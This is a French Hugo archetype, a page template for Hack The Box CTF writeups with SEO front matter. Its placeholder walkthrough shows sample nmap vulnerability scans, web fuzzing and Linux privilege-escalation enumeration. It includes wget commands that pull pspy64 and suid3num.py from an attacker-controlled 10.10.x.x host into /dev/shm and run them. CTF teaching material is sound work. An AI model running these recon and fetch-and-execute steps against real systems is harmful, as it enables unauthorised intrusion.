---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "{{ replace .Name "-" " " | title }} — HTB Easy Writeup & Walkthrough"
linkTitle: "{{ replace .Name "-" " " | title }}"
slug: "{{ .Name }}"
date: {{ .Date }}
#lastmod: {{ .Date }}
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Easy","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "{{ replace .Name "-" " " | title }}"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "{{ replace .Name "-" " " | title }}"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---
{{ $machine := lower (path.Base (strings.TrimSuffix "/" .File.Dir)) }}
<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <{{ replace .Name "-" " " | title }}> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
nmap -sCV -p- -T4 -oN scans/nmap_full.txt {{ $machine }}.htb
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
 nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "{{ $machine }}.htb"
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb {{ $machine }}.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt`  regroupe les chemins découverts, sans parcourir l’ensemble des logs générés.

### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
mon-subdomains {{ $machine }}.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
- Payloads utilisés (extraits pertinents).
- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).

---

## Escalade de privilèges

{{< escalade-intro user="ssh_user" >}}

### Surveillance des processus avec pspy64

Une autre vérification classique consiste à surveiller les processus exécutés sur la machine afin d’identifier d’éventuelles tâches automatiques lancées par `root`.

Pour cela, tu ouvres une deuxième session SSH et tu utilises l’outil `pspy64`.

Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’objectif est de lancer d’abord l’observation des tâches root puis de continuer l’énumération dans une autre session.

Tu télécharges ensuite l’outil dans un répertoire accessible en écriture :

```bash
cd /dev/shm
wget http://10.10.x.x:8000/pspy64
chmod +x pspy64
./pspy64
```

L’objectif est notamment de détecter :

- des scripts exécutés automatiquement par `root`
- des tâches cron personnalisées
- des commandes exécutées périodiquement
- des accès à des fichiers sensibles
- des binaires exécutés avec des chemins relatifs

Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’énumération afin d’observer d’éventuelles tâches exécutées automatiquement par `root`.

### Sudo -l

Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :

```
ssh_user@planning:~$ sudo -l
[sudo] password for ssh_user: 
Sorry, user ssh_user may not run sudo on planning.
```

L’utilisateur `ssh_user` ne possède donc aucun droit sudo exploitable.

### Exploration du contexte utilisateur

Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :

```
whoami
id
pwd
uname -a
hostname
```

Résultat :

```
ssh_user
uid=1000(ssh_user) gid=1000(ssh_user) groups=1000(ssh_user)
/home/ssh_user
Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
planning
```

Cette étape permet notamment de confirmer :

- l’utilisateur courant
- les groupes associés
- le noyau Linux utilisé
- le nom de la machine
- le répertoire de travail actuel

### Recherche de binaires SUID

Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.

```
find / -perm -4000 -type f 2>/dev/null
```

La liste obtenue ne contient que des binaires système classiques tels que :

```
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
...
```

Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.

### Analyse des Linux capabilities

Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.

La vérification se fait avec la commande suivante :

```
getcap -r / 2>/dev/null
```

Résultat :

```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.

### Analyse complémentaire avec suid3num.py

Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :

- les binaires SUID intéressants
- leur présence éventuelle dans GTFOBins

Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/dev/shm`) :

```
cd /dev/shm
wget http://10.10.x.x:8000/suid3num.py
python3 suid3num.py
```

L’analyse confirme principalement la présence de binaires système classiques :

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
...
```

L’outil confirme que :

- tous les binaires SUID présents sont standards
- aucun binaire personnalisé n’est identifié
- aucun binaire exploitable via GTFOBins n’est détecté

Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.

### Inspection des tâches cron

Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.

Les crons système peuvent être consultés avec :

```
cat /etc/crontab
```

Résultat :

```
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Aucune tâche personnalisée ni script modifiable par l’utilisateur `ssh_user` n’apparaît ici.

### Analyse des services locaux

Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.

```
netstat -tulpn
```

Résultat :

### Conclusion de l’énumération manuelle

### Analyse avec linpeas.sh
Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)

---

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}